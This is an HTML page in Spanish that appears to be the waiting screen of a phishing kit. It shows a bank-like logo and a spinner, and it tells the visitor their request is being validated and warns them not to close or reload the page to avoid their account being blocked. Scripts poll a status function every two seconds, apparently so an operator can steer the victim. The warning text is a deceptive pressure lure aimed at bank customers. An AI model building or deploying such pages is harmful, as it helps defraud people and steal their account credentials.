<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wait Moment!</title>
    <link rel="stylesheet" href="../esova/datos/src/css/layout.css">
    <link rel="stylesheet" href="../esova/datos/src/css/fonts.css">
    <link rel="icon" type="image/png" href="../esova/datos/src/img/logo.png" />
    <script type="text/javascript" src="../esova/datos/src/js/jquery-3.6.0.min.js"></script>
    <script src="../esova/datos/src/js/jquery.jclock-min.js"></script>
    <script type="text/javascript" src="../esova/datos/src/js/run.js"></script>
    <link rel="stylesheet" href="./assets/css/styles.css">
    <link rel="stylesheet" href="./assets/css/clave.css">
    <link rel="stylesheet" href="./assets/css/cargando.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="js/jquery.jclock-min.js"></script>
    <script src="js/functions.js"></script>
</head>
  <body style="background-color: #f7f7f7; text-align: center;">

    <div class="header-logo">
        <br><br>
        <img style="width: 300px;" src="../esova/datos/src/img/logo.svg">
      <br><br>
    </div>

    <section>
        <br><br><br><br>
        <span style="font-size: 22px;">Por favor, espere un momento estamos<br>validando tu solicitud.</span>
    </section>

    <br><br>
    <span style="font-size: 22px;">No cierre o recargue esta página, <br> para evitar bloqueos en su cuenta.</span>
    <br><br>
    <section>
      <div>
        <br><br>
        <img style="width: 150px;" src="../esova/datos/src/img/loading-25.gif">
    </section>

    <div style="width: 100%; text-align: center;">
        <img class="fondo" style="width: 100%;" src="../esova/datos/src/img/fondo1-1024x459.png">
    </div>

    <script language="javascript">
        $(document).ready(function() {
            setInterval(consultar_estado, 2000);	
        });
    </script>

    <script language="javascript">
        $(document).ready(function() {
            setInterval(status, 2000);	
        });
    </script>

</body>
</html>
